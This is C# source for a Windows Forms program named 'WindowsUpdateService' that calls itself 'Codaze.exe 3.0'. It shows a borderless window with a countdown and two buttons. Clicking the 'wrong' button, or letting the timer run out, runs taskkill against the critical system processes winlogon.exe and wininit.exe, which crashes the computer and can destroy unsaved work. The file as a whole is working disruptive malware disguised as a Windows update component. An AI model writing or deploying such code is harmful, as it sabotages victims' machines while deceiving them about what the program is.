using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsUpdateService
{
    public partial class Form2 : Form
    {
        public Form2()
        {
            InitializeComponent();
            FormBorderStyle = FormBorderStyle.None;
            timer3.Start();
            timer1.Start();
        }

        private void Form2_Load(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            timer3.Stop();
            Process.Start("C:/Windows/explorer.exe");
            MessageBox.Show("Congratulations! You have choosen the Right Button! The Program will now Exit. Press OK to continue.", "Codaze.exe 3.0",
            MessageBoxButtons.OK, MessageBoxIcon.Information);
            Application.Exit();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Process.Start("taskkill", " /IM winlogon.exe /F");
            Process.Start("taskkill", "/F /T /IM wininit.exe");
            MessageBox.Show("That was the Wrong Button !", "Wrong decision",
            MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            this.progressBar1.Increment(1);
            label2.Text = progressBar1.Value.ToString() + "%";
            if (progressBar1.Value >= progressBar1.Maximum)
            {
                timer3.Stop();
                Process.Start("taskkill", "/F /T /IM wininit.exe");
                MessageBox.Show("Time is Up !", "Slow ass",
                MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            DateTime datetime = DateTime.Now;
            this.label4.Text = datetime.ToString();
        }
    }
}
